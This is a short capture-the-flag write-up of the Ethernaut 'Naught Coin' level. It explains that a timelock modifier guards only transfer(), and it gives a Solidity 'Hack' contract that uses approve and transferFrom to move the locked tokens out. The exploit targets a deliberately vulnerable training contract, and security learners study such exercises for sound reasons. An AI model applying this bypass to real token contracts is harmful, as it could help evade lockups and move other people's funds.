# Naught Coin Ethernaut

## Goals

=> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

### Hints

- The ERC20 Spec
- The OpenZeppelin codebase

### Solution

- The weakness lies in the `lockTokens()` modifier which only checks if the msg.sender is the player and then checks for the timeLock, if we just approve another contract for the amount of tokens we own, that contract could just call ERC20s `transferFrom()` and transfer the amount of tokens to an arbitrary addresss since he is an approved spender
- Step 1: Deploy Hack contract
- Step 2: Approve Hack contract for the balanceOf the player
- Step 3: Call attacj function on Hack contract

### Fuzzing Contract

```solidity
contract Hack {
    address player = msg.sender;
    NaughtCoin naughtCoin;
    constructor(address _naughtCoin){
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    function attack() public {
        naughtCoin.transferFrom(player, address(this), 1000000000000000000000000);
    }
}
```
